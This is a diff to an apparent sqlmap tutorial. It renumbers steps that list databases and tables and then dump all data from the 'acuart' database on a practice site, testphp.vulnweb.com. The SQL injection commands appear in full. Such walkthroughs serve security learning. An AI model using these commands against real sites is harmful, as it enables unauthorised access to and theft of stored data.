@@ -56,13 +56,13 @@ sqlmap -u http://testphp.vulnweb.com/product.php?pic=1 --dbs
 
 <img width="1500" height="500" src="sqlmap/1.png" alt="Awesome">
  
-1. List tables in the acuart database:
+2. List tables in the acuart database:
 ```bash
    sqlmap -u http://testphp.vulnweb.com/product.php?pic=1 -D acuart --tables  
 ```
 <img width="1500" height="500" src="sqlmap/2.png" alt="Awesome">
 
-2. Dump all data from the acuart database:
+3. Dump all data from the acuart database:
 ```bash
    sqlmap -u http://testphp.vulnweb.com/product.php?pic=1 -D acuart --dump-all  
 ```
